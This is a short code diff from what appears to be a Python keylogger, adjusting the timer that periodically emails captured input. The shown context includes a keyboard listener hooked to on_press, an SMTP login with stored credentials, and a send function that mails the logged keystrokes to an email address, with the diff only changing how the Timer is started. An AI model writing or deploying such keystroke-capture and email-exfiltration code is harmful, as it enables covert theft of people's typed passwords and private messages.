@@ -77,7 +77,8 @@ def send():
     if len(msg)>0: 
         server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg)
         print("[ - ] " + str(datetime.now()) + ": Message Send!")
-    Timer(TIME, send).start()
+    t1 = Timer(TIME, send)
+    t1.start()
  
 listener = Listener(on_press=on_press)
 listener.start()
@@ -87,6 +88,7 @@ server.starttls()
 
 try: server.login(EMAIL_ADDRESS, EMAIL_PASSWD), print(Fore.GREEN + "\nConnection ESTABLISHED\n" + Style.RESET_ALL)
 except smtplib.SMTPAuthenticationError: print(Fore.RED + "\nConnection REFUSED" + Style.RESET_ALL + " (Check credentials or the references)\n"), exit()
- 
-Timer(0.0, send).start()
+
+main_timer = Timer(5.0, send)
+main_timer.start()
 
